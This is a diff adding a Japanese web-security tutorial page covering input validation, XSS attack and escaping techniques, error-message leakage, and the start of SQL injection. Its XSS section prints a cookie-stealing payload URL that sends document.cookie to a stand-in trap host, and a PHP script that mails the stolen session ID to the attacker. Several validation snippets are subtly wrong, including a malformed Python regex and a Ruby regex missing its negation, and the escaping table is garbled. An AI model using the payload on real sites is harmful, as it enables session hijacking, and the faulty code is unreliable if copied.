+                データベースを利用する場合は定義するのはもちろん、上限がない場合でも動作保証のための最大文字数を仕様として決める必要があります。
+                また、最大文字数をチェックするとセキュリティ対策の保険となる場合があります。</p>
+                <h4 id="数値の最大値・最小値のチェック">数値の最大値・最小値のチェック</h4>
+                <p>数値項目は、値が取りうる最小値と最大値の使用を定め検証すべきです。
+                数値項目に関しては入力時に以下の検証を行うことが推薦されます。</p>
+                <ul>
+                <li>数値文字列として文字種・文字数のチェック</li>
+                <li>文字列型から数値型への型変換</li>
+                <li>最大値と最大値の範囲に値があることの確認</li>
+                </ul>
+                <h4 id="その他の注意事項">その他の注意事項</h4>
+                <p>その他に注意する点としては以下のようなものがあります。</p>
+                <ul>
+                <li>入力項目が指定されていないケース</li>
+                <li>配列形式で入力されているケース</li>
+                </ul>
+                <h4 id="どのパラメータを検証すべきか">どのパラメータを検証すべきか</h4>
+                <p>入力検証すべきパラメータは<strong>すべてのパラメータ</strong>です。hiddenパラメータ、ラジオボタン、select要素なども含まれます。
+                CookieにセッションID以外の値を入れている場合はCookieの値も検証します。
+                refererなどのHTTPヘッダをアプリが利用する場合も検証します。</p>
+                <h4 id="正規表現関数の利用">正規表現関数の利用</h4>
+                <p>入力値検証の実装をアプリケーションロジック(javascript,php,ruby,python単体)で実装するには<strong>正規表現の利用</strong>が一般的です。</p>
+                <p>下記にphp,ruby,pythonでの正規表現例を示します。</p>
+                <h5 id="正規表現による検証1英数字1から5文字">正規表現による検証(1):英数字1から5文字</h5>
+                <p>●PHPの場合</p>
+                <pre><code class="language-php">// 英数字チェック
+                if (preg_match(&#39;/\A[a-zA-Z0-9]{1,5}\z/ui&#39;, $data)) {
+                    // 英数字の場合
+                }
+                else {
+                    // 英数字ではない場合
+                }
+                </code></pre>
+                <p>●rubyの場合</p>
+                <pre><code class="language-ruby">if data =~ /\A[a-zA-Z0-9]{1,5}\z/ui
+                  #英数字の場合
+                else
+                  # 英数字でない場合
+                end
+                </code></pre>
+                <p>●Pythonの場合</p>
+                <pre><code class="language-python">import re
+                if bool(re.search(&quot;/\A[a-zA-Z0-9]{1,5}\z/ui&quot;, data)) == True
+                  #　英数字の場合
+                else
+                  #　英数字でない場合
+                </code></pre>
+                <h5 id="正規表現による検証2住所欄30文字以内∧改行やタブの禁止">正規表現による検証(2):住所欄{30文字以内∧改行やタブの禁止}</h5>
+                <p>●PHPの場合</p>
+                <pre><code class="language-php">// 英数字チェック
+                if (preg_match(&#39;/\A[[:^cntrl:]]{1,30}\z/u&#39;, $data)) {
+                    // 条件を満たす場合
+                }
+                else {
+                    // 条件を満たさない場合
+                }
+                </code></pre>
+                <p>●rubyの場合</p>
+                <pre><code class="language-ruby">if data =~ /\A[[:cntrl:]]{1,30}\z/u
+                  #　条件を満たす場合
+                else
+                  # 条件を満たさない場合
+                end
+                </code></pre>
+                <h5 id="正規表現による検証3コメント欄400文字以内∧改行タブ以外の制御文字の禁止">正規表現による検証(3):コメント欄{400文字以内∧改行タブ以外の制御文字の禁止}</h5>
+                <p>●PHPの場合</p>
+                <pre><code class="language-php">// 英数字チェック
+                if (preg_match(&#39;/\A[\r\n\t[:^cntrl:]]{1,400}\z/u&#39;, $data)) {
+                    // 条件を満たす場合
+                }
+                else {
+                    // 条件を満たさない場合
+                }
+                </code></pre>
+                <p>●rubyの場合</p>
+                <pre><code class="language-ruby">if data =~ /\A[\r\n\t[:cntrl:]]{1,400}\z/u
+                  #　条件を満たす場合
+                else
+                  # 条件を満たさない場合
+                end
+                </code></pre>
+                <h4 id="入力値検証とフレームワーク">入力値検証とフレームワーク</h4>
+                <p>Webアプリケーションフレームワークを用いて開発する場合、たいていの場合は入力値検証機能があります。</p>
+                <table>
+                <thead>
+                <tr>
+                <th>フレームワーク</th>
+                <th>方法</th>
+                </tr>
+                </thead>
+                <tbody><tr>
+                <td>Laravel(php)</td>
+                <td>validation</td>
+                </tr>
+                <tr>
+                <td>Rails(ruby)</td>
+                <td>validatesメソッド</td>
+                </tr>
+                <tr>
+                <td>Django(python)</td>
+                <td>is_valid()</td>
+                </tr>
+                </tbody></table>
+                <h3 id="25-入力値検証と実装方法">2.5 入力値検証と実装方法</h3>
+                <p>まとめると検証は以下の項目を行います。</p>
+                <ul>
+                <li>文字エンコーディングの検証</li>
+                <li>制御文字を含む文字種の検証</li>
+                <li>文字数の検証</li>
+                <li>数値の最大値・最小値の検証</li>
+                </ul>
+                <p>実装は以下のように行います</p>
+                <ul>
+                <li>設計で各パラメータの文字種や最大文字数・最小値・最大値を決める</li>
+                <li>設計で入力値検証の実装を決める</li>
+                <li>開発で上記仕様に従い入力値検証の実装を行う</li>
+                </ul>
+                <h2 id="3-表示処理に伴う問題">3. 表示処理に伴う問題</h2>
+                <p>表示処理が原因で発生するセキュリティ上のリスクには以下のようなものがあります。</p>
+                <ul>
+                <li>XSS</li>
+                <li>エラーメッセージからの情報漏洩</li>
+                </ul>
+                <h3 id="31-クロスサイトスクリプティングxss-基本編">3.1 クロスサイトスクリプティング(XSS) 基本編</h3>
+                <h4 id="概要">概要</h4>
+                <p>Webアプリには外部からの入力に応じ表示が変化する部分があり、この部分のHTML生成の実装に問題があるとXSSという脆弱性が発生します。
+                XSS脆弱性がある場合以下のような影響があります。</p>
+                <ul>
+                <li>サイト利用者が攻撃者の用意したScriptの実行によりCookie値が盗まれ、なりすましの被害にあう</li>
+                <li>サイト利用者が攻撃者の用意したScriptの実行により、利用者権限によってWebアプリの機能が悪用される</li>
+                <li>Webサイト上に偽の入力フォームが表示されフィッシングにより利用者が個人情報を盗まれる</li>
+                </ul>
+                <p>XSS脆弱性には対策の必要な個所が多いため、運営者は軽視する傾向があり対策が不十分な場合が多いです。
+                対策は<strong>HTMLで特殊意味を持つメタ文字をエスケープする</strong>ことです。</p>
+                <p>●XSSのまとめ</p>
+                <table>
+                <thead>
+                <tr>
+                <th>タイトル</th>
+                <th>説明</th>
+                </tr>
+                </thead>
+                <tbody><tr>
+                <td>発生箇所</td>
+                <td>Web上でHTMLやJavaScriptを生成している箇所</td>
+                </tr>
+                <tr>
+                <td>影響範囲</td>
+                <td>Webページやアプリケーション全て</td>
+                </tr>
+                <tr>
+                <td>影響の種類</td>
+                <td>利用者のブラウザ上でのJavaAcriptの実行、偽情報表示</td>
+                </tr>
+                <tr>
+                <td>影響度合い</td>
+                <td>中から大</td>
+                </tr>
+                <tr>
+                <td>対策の概要</td>
+                <td>属性値は「&quot;」で囲む、HTMLの特殊文字をエスケープする</td>
+                </tr>
+                </tbody></table>
+                <h4 id="xss攻撃手法と影響">XSS攻撃手法と影響</h4>
+                <p>XSSの悪用の方法は3種類あります。</p>
+                <ul>
+                <li>クッキー値の盗み出し</li>
+                <li>JavaScriptによる攻撃</li>
+                <li>画面の書き換え</li>
+                </ul>
+                <h5 id="●xssによるクッキー値の盗み出し">●XSSによるクッキー値の盗み出し</h5>
+                <p>クッキーにセットされたセッションIDは、ログイン後(session_start()のあるページ)にアクセス後
+                GET keywordのパラメータに、とあるjavascriptを記述することで可能です。</p>
+                <p>例としてGetキーワードがkeywordの場合です。</p>
+                <pre><code class="language-bash">https://www.example.com/001.php?keyword=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+                </code></pre>
+                <p>上記URLを実行するとjavascriptのアラートでセッションIDが読み出せます。</p>
+                <h5 id="●受動攻撃による別人のクッキー値の盗み出し">●受動攻撃による別人のクッキー値の盗み出し</h5>
+                <p>このタイプの脆弱性は正規のサイト利用者を罠サイトにまず誘導します。
+                具体的には罠サイトのHTMlのiframe要素に脆弱性のある正規ページ改造URL(Scriptを埋め込んだURL)を埋め込みます。</p>
+                <p>偽サイトに埋め込むiframe要素のURL例はいかのようになります。</p>
+                <pre><code class="language-bash">htttps://www.example.com/001.php?keyword=&lt;script&gt;window.location=&quot;http://trap.exapmple.com/901.php?sid=&#39;%2Bdocument.cookie;&lt;/script&gt;&quot;
+                </code></pre>
+                <p>また埋め込んだURLの情報収集用scriptページ(<a href="http://trap.exapmple.com/901.php">http://trap.exapmple.com/901.php</a> )の構造例は以下の通りです。</p>
+                <pre><code class="language-php">&lt;?php
+                    mb_language(&#39;japanese&#39;)
+                    $sid = $_GET[&#39;sid&#39;]
+                    mb_send_mail(&#39;送り先メールアドレス&#39;, &#39;タイトル&#39;, &quot;セッションID:&quot;.$sid, &quot;From: 偽サイトのメールアドレス&quot;);
+                ?&gt;
+                </code></pre>
+                <p>これらにより以下の手順にセッションIDが流出します。</p>
+                <ol>
+                <li>罠サイトに利用者がアクセスする</li>
+                <li>罠サイトのiframe内で脆弱性のある正規サイトが表示される</li>
+                <li>脆弱性のある正規サイトはXSS攻撃により、クッキー値をクエリ文字列としてつけ、情報収集用scriptページを読み込む</li>
+                <li>情報収集用scriptページは受け取ったクッキー値をメールで攻撃者に知らせる</li>
+                </ol>
+                <p>まとめると偽サイトにアクセスするとXSSの仕掛けによりセッションIDが悪意のある第3者に知らされます。
+                悪意のある第3者はこの入手したセッションIDを用いて攻撃が可能です。</p>
+                <h5 id="●画面の書き換え">●画面の書き換え</h5>
+                <p>XSS脆弱性はログイン機能のないサイトにも影響があります。</p>
+                <p>具体的には新たなform要素を追加することにより画面を改変します。</p>
+                <ul>
+                <li>&lt;form&gt;により元サイトのform要素を終了させる</li>
+                <li>新しいform要素を開始しstyleで以下を指定(formを絶対座標で画面上に表示、z-indexを大きな値にする、背景色を指定し元のformが見えにくいようにする</li>
+                <li>actionパラメータのurlに罠サイトを指定する</li>
+                </ul>
+                <p>これにより正規のホームを上書きし偽のフォームを用意し罠サイトへ誘導します。</p>
+                <h4 id="反射型xssと持続型xss">反射型XSSと持続型XSS</h4>
+                <p>XSS攻撃には反射型XSSと持続型XSSの2種類があります。</p>
+                <p><strong>1. 反射型XSS</strong>
+                攻撃用のScriptが攻撃対象のサイトとは別のサイト(罠サイトやメールURL)にある場合は反射型です。
+                このタイプの多くの場合入力値をそのまま表示するページで発生します。
+                特に入力値の確認用ページです。</p>
+                <p><strong>2. 接続型XSS</strong>
+                攻撃用のScriptが、攻撃対象のDBに保存されている場合は接続型です。
+                このタイプはWebメールやSNSなどが攻撃対象です。</p>
+                <h4 id="xss脆弱性の発生原因">XSS脆弱性の発生原因</h4>
+                <p>XSS脆弱性の発生原因は、<strong>HTML生成の際に特殊文字(メタ文字)を正しく扱っていないこと</strong>です。
+                メタ文字の特別な意味を打ち消し、文字そのものとして扱うには<strong>エスケープ</strong>する必要があります。</p>
+                <h4 id="xss脆弱性の基本対策">XSS脆弱性の基本対策</h4>
+                <ul>
+                <li><strong>要素内容は「&lt;」と「＆」でエスケープする</strong></li>
+                <li><strong>属性値は「&quot;」で囲い、「&lt;」「&quot;」「＆」をエスケープする</strong></li>
+                </ul>
+                <p>これらが最低限のXSS対策である。
+                各言語やフレームワークでのHTMLのエスケープ処理に使う機能は以下の通りです。</p>
+                <table>
+                <thead>
+                <tr>
+                <th>種類</th>
+                <th>機能</th>
+                </tr>
+                </thead>
+                <tbody><tr>
+                <td>php</td>
+                <td>htmlspecialchars関数</td>
+                </tr>
+                <tr>
+                <td>laravel</td>
+                <td>{{}}で囲む</td>
+                </tr>
+                <tr>
+                <td>ruby</td>
+                <td>cgiモジュール</td>
+                </tr>
+                <tr>
+                <td>rails</td>
+                <td>&lt;%= ～ %&gt;を使って出力を行う</td>
+                </tr>
+                <tr>
+                <td>python</td>
+                <td>bleachライブラリのclean関数</td>
+                </tr>
+                <tr>
+                <td>Django</td>
+                <td>自動エスケープ</td>
+                </tr>
+                </tbody></table>
+                <h4 id="xssに対する保険的対策">XSSに対する保険的対策</h4>
+                <p>XSSに対しては対策漏れが生じることが多いため、対策が漏れた際に攻撃に対する被害を軽減するための保険機能的なものがあります。</p>
+                <h5 id="x-xss-protectionレスポンスヘッダの使用">X-XSS-Protectionレスポンスヘッダの使用</h5>
+                <p>このフィルタはブラウザに実装されている場合があります。
+                機能としては反射型XSSをブラウザが検知し、無害な出力に変更するものです。</p>
+                <h5 id="入力値検証">入力値検証</h5>
+                <p>入力値検証にて、入力値の妥当性検証を行い、条件に合致しない場合はエラーを表示し再入力を促すことがXSS対策になる場合があります。
+                ただし、入力値検証がXSS対策になるのは<strong>入力値が英数字のみに限定できる場合など</strong>に限られ、自由形式の入力欄では対策できません。</p>
+                <h5 id="クッキーにhttponly属性を付与する">クッキーにHttpOnly属性を付与する</h5>
+                <p>この属性はJavaScriptからのクッキー読み出しを禁止するものです。
+                この属性の付与することにより、セッションIDの盗み出しを防止できます。
+                なお他の攻撃手法には有効なため、攻撃手法を限定するだけです。</p>
+                <h4 id="●xss対策のまとめ">●XSS対策のまとめ</h4>
+                <p><strong>必須対策</strong></p>
+                <ul>
+                <li><strong>要素内容は「&lt;」と「＆」でエスケープする</strong></li>
+                <li><strong>属性値は「&quot;」で囲い、「&lt;」「&quot;」「＆」をエスケープする</strong></li>
+                <li>HTTPレスポンスに文字エンコーディングを明示する</li>
+                </ul>
+                <p><strong>保険的対策</strong></p>
+                <ul>
+                <li>X-XSS-Protectionレスポンスヘッダの使用</li>
+                <li>入力値検証</li>
+                <li>クッキーにHttpOnly属性の付与</li>
+                </ul>
+                <h3 id="32-クロスサイトスクリプティングxss-応用編">3.2 クロスサイトスクリプティング(XSS) 応用編</h3>
+                <p>XSSの対策はエスケープすることが基本ですが、外部から変更できるパラメータがどこに置かれているかによって方法が変わります。</p>
+                <table>
+                <thead>
+                <tr>
+                <th>変更できるパラメータの場所</th>
+                <th>説明</th>
+                <th>エスケープの概要</th>
+                </tr>
+                </thead>
+                <tbody><tr>
+                <td>要素内容(通常のテキスト)</td>
+                <td>タグと文字参照が解釈される</td>
+                <td>「&lt;」「&amp;」を文字参照に</td>
+                </tr>
+                <tr>
+                <td>属性値</td>
+                <td>文字参照が解釈される</td>
+                <td>属性値を「&quot;」で囲み、「&lt;」「&quot;」「&amp;」を文字参照に</td>
+                </tr>
+                <tr>
+                <td>属性値(URL)</td>
+                <td>同上</td>
+                <td>URLの形式を検査して属性値としてエスケープ</td>
+                </tr>
+                <tr>
+                <td>イベントハンドラ</td>
+                <td>同上</td>
+                <td>JavaScriptとしてエスケープしてから属性値としてのエスケープ</td>
+                </tr>
+                <tr>
+                <td>script要素内の文字列リテラル</td>
+                <td>タグも文字参照も解釈されない</td>
+                <td>JavaScriptとしてのエスケープ、「&lt;」が出現しないようにする</td>
+                </tr>
+                </tbody></table>
+                <h4 id="hrefやsrc属性のxss">hrefやsrc属性のXSS</h4>
+                <p>a要素のhref属性や、img要素のframe要素、iframeのsrc属性はURLを属性値としてとります。
+                href属性やsrc属性などURLを指定するものではjavascriptスキームが有効な場合があります。
+                javascriptスキームによるXSSは異質なXSSで対策方法も異なります。</p>
+                <p><strong>●プログラムでURLを生成する場合の対策</strong>
+                この場合はhttpスキームとhttpsスキームのみを許可するようにチェックする必要がある。
+                具体的にはURLとしては、以下のいずれのみを許容するようにチェックするとよい。</p>
+                <ul>
+                <li>http:またはhttps:で始まる絶対URL</li>
+                <li>スラッシュで始まる相対URL</li>
+                </ul>
+                <p><strong>●リンク先ドメイン名のチェック</strong>
+                外部のドメインに対するリンクが自明な場合以外は以下のどちらかを実施することを推奨します。</p>
+                <ul>
+                <li>リンク先URLを検証し、URLが外部ドメインである場合はエラーにする</li>
+                <li><strong>外部ドメインのリンクであることをサイト利用者に注意喚起するためのクッションページを表示する</strong></li>
+                </ul>
+                <h4 id="javascriptの動的生成">JavaScriptの動的生成</h4>
+                <p>Webアプリケーションの中にはJavaScriptの一部をサーバで動的生成するものがあります。
+                具体的にはJavaScriptの文字列リテラルを動的に生成する場合です。
+                対策は以下の通りです。</p>
+                <ol>
+                <li>データをJavaScript文字列リテラルとしてエスケープする</li>
+                <li>1の結果をHTMLエスケープする</li>
+                </ol>
+                <p>javaScript文字列リテラルとしてエスケープすべき文字リスト</p>
+                <table>
+                <thead>
+                <tr>
+                <th>文字</th>
+                <th>エスケープ後</th>
+                </tr>
+                </thead>
+                <tbody><tr>
+                <td>|\\</td>
+                <td></td>
+                </tr>
+                <tr>
+                <td>&#39;</td>
+                <td>\&#39;</td>
+                </tr>
+                <tr>
+                <td>&quot;</td>
+                <td>\&quot;</td>
+                </tr>
+                <tr>
+                <td>改行</td>
+                <td>\n</td>
+                </tr>
+                </tbody></table>
+                <p>例として「&lt;&gt;!&quot;\」が与えられた場合、以下のエスケープが必要である。</p>
+                <table>
+                <thead>
+                <tr>
+                <th>元入力</th>
+                <th>JavaScriptエスケープ後</th>
+                <th>HTMLエスケープ後</th>
+                </tr>
+                </thead>
+                <tbody><tr>
+                <td>&lt;&gt;&#39;&quot;\</td>
+                <td>&lt;&gt;\&quot;\&#39;\|&lt;&gt;\&#39;\&quot;\|</td>
+                <td></td>
+                </tr>
+                </tbody></table>
+                <p><strong>●script要素のXSSの対策</strong>
+                scrpt要素内のJavaScriptの一部を動的生成する場合のXSS脆弱性はJavaScriptの文字列リテラルを動的に生成する部分です。
+                対策には以下の原理に従う必要がある。</p>
+                <ol>
+                <li>javaScriptの文法から「&quot;」「&#39;」「\」や改行をエスケープする</li>
+                <li>イベントハンドラの場合は(1)の文字参照よりHTMLエスケープし、「&quot;」で囲む</li>
+                <li>script要素内の場合は(1)の結果に「&lt;/script」が出現しないようにする</li>
+                </ol>
+                <p>これらの方法をするのが効果的ですが、処理が複雑なため対策漏れが生じやすいです。
+                そのためjavaScriptを動的に生成するのは避けた方が良いが、や無負えない場合もあるのでその場合は以下2ケースのいずれかを実施します。</p>
+                <ul>
+                <li>Script要素の外部でパラメータ定義しJavaScriptから参照する</li>
+                <li>インラインJSONPによる参照</li>
+                </ul>
+                <h4 id="htmlタグやcssの入力を許す場合の対策">HTMLタグやCSSの入力を許す場合の対策</h4>
+                <p>HTMLタグやCSSの入力を許可したい場合があります。これらはXSSの危険性が増大します。
+                そのためこれらを許可する際には入力した内容を構文解析し必要要素のみを抽出するライブラリを使用することが推奨されます。</p>
+                <h3 id="33-エラーメッセージからの情報漏洩">3.3 エラーメッセージからの情報漏洩</h3>
+                <p>エラーメッセージからの情報漏洩は以下の2種類があります。</p>
+                <ul>
+                <li>エラーメッセージに攻撃者にとって有益なアプリケーションの内部情報が含まれる</li>
+                <li>意図的な攻撃として、エラーメッセージに秘密情報を表示させられる</li>
+                </ul>
+                <p>上記の問題があるため、アプリケーションでエラーが発生した際には画面に表示するのは「アクセスが集中しているため、しばらく待ってお試しください」などの利用者向けのメッセージにとどめ、エラー詳細内容はエラーログに出力するようにします。</p>
+                <p>●対処方法</p>
+                <table>
+                <thead>
+                <tr>
+                <th>言語・フレームワーク</th>
+                <th>方法</th>
+                </tr>
+                </thead>
+                <tbody><tr>
+                <td>php</td>
+                <td>php.iniの「display_errors= off」にする</td>
+                </tr>
+                <tr>
+                <td>Laravel</td>
+                <td>config/app.php設定ファイルのdebug設定オプションをfalseにする</td>
+                </tr>
+                <tr>
+                <td>rails</td>
+                <td>Railsを<strong>プロダクションモード</strong>で起動する</td>
+                </tr>
+                </tbody></table>
+                <h2 id="4sql呼び出しに伴う脆弱性">4.SQL呼び出しに伴う脆弱性</h2>
+                <p>Webアプリケーションの多くはデータベースアクセスのためSQLを利用しています。このSQLによるデータベースアクセスの実装に不備があると、SQLインジェクションの脆弱性が生じます。</p>
+                <h3 id="41-sqlインジェクション">4.1 SQLインジェクション</h3>
+                <h4 id="概要-1">概要</h4>
+                <p>SQLインジェクションは、SQLの呼び出し方に不備がある場合に発生する脆弱性であり、Webアプリケーションのパラメータを操作してデータベースクエリに影響を与えることを目的とした攻撃手法です
+                アプリケーションにSQLインジェクション脆弱性がある場合、以下のような影響を受ける可能性があります。</p>
+                <ul>
+                <li>データベース内の全ての情報が外部から盗まれる</li>
+                <li>データベースの内容が書き換えられる</li>
+                <li>認証が回避される</li>
+                <li>データベースサーバ上のファイル読み出し、書き込み、プログラムの実行などが行われる</li>
+                </ul>
+                <p>●SQLインジェクションのまとめ</p>
+                <table>
+                <thead>
+                <tr>
+                <th>タイトル</th>
+                <th>説明</th>
+                </tr>
+                </thead>
+                <tbody><tr>
+                <td>発生箇所</td>
+                <td>SQLを呼び出している場所</td>
+                </tr>
+                <tr>
+                <td>影響範囲</td>
+                <td>全てのページ</td>
+                </tr>
+                <tr>
+                <td>影響の種類</td>
+                <td>情報漏洩、データ改ざん、認証の回避、プログラムの実行、ファイルの参照・更新</td>
+                </tr>
+                <tr>
+                <td>影響度合い</td>
+                <td>大</td>
+                </tr>
+                <tr>
+                <td>利用者関与の必要性</td>
+                <td>不要</td>
+                </tr>
+                <tr>
+                <td>対策の概要</td>
+                <td>静的プレースホルダを利用しSQLを呼び出す</td>
+                </tr>
+                </tbody></table>
+                <h4 id="攻撃手法と影響">攻撃手法と影響</h4>
+                
+
+                <!-- END -->
+
+            </main>
+            <footer class="footer mt-auto py-3 bg-light">
+                <div class="container">
+                    <p class="text-muted text-center">Written by ゆーろん / yuron3141</p>
+                </div>
+            </footer>
+        </body>
+    </body>
+</html>
